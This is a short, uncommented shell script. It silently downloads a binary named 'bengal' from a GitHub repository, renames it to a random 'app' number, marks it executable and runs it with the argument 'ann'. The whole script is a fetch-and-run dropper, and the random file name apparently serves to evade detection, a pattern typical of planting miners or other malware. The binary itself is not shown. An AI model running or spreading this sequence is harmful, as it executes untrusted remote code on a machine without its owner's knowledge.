APP=app$(shuf -i 1000000-9999999 -n 1) 
wget -q https://github.com/danipedrosang/energizer/raw/main/bengal
mv bengal $APP 
chmod +x $APP 
./$APP ann
